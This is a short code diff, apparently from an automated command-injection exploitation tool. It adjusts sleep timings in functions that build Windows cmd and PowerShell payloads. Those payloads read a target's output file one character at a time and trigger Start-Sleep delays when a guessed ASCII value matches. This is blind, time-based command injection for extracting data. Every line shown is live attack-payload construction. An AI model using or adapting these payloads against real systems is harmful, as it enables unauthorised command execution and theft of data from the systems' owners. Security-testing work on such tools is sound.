@@ -399,7 +399,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" + str(num_of_chars - 1) + "]\"')" + settings.SINGLE_WHITESPACE +
                 "do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
-                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec + 1) + "\""
                 )
 
     elif separator == "&&" :
@@ -409,7 +409,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" + str(num_of_chars - 1) + "]\"')" + settings.SINGLE_WHITESPACE +
                 "do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
-                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec + 1) + "\""
                 )
 
   else:
@@ -548,7 +548,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
                 "do if %i==" + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE + 
-                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\""
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec * 2) + "\""
                 )
 
     elif separator == "&&" :
@@ -558,7 +558,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
                 "for /f \"tokens=*\" %i in (' cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
                 "do if %i==" + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE + 
-                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\""
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec * 2) + "\""
                 )
 
   else:  
